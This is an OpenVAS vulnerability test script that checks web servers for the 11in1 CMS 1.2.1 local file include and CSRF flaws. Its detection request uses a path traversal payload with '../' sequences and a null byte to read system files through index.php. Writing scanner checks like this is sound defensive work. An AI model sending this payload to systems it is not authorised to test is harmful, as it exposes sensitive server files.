###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_11in1_52025.nasl 9352 2018-04-06 07:13:02Z cfischer $
#
# 11in1 Cross Site Request Forgery and Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "11in1 is prone to a cross-site request-forgery and a local file
include vulnerability.

An attacker may leverage these issues to execute arbitrary script code
in the browser of an unsuspecting user in the context of the affected
site, steal cookie-based authentication credentials, and open or run
arbitrary files in the context of the affected application.

11in1 1.2.1 is vulnerable; other versions may also be affected.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103424");
 script_bugtraq_id(52025);
 script_cve_id("CVE-2012-0996","CVE-2012-0997");
 script_version ("$Revision: 9352 $");
 script_name("11in1 Cross Site Request Forgery and Local File Include Vulnerabilities");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/52025");
 script_xref(name : "URL" , value : "http://www.11in1.org/");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/521660");
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2012-02-16 11:39:18 +0100 (Thu, 16 Feb 2012)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 script_tag(name : "summary" , value : tag_summary);

 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
   
port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

files = traversal_files();

foreach dir( make_list_unique( "/11in1", "/cms", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/index.php";
  buf = http_get_cache( item:url, port:port );

  if( buf =~ "generator.*11in1\.org" ) {
    foreach file( keys( files ) ) {
      url = dir + "/index.php?class=" + crap( data:"../", length:6 * 9 ) + files[file] + "%00";
      if( http_vuln_check( port:port, url:url, pattern:file ) ) {
        report = report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }  
  }
}

exit( 99 );
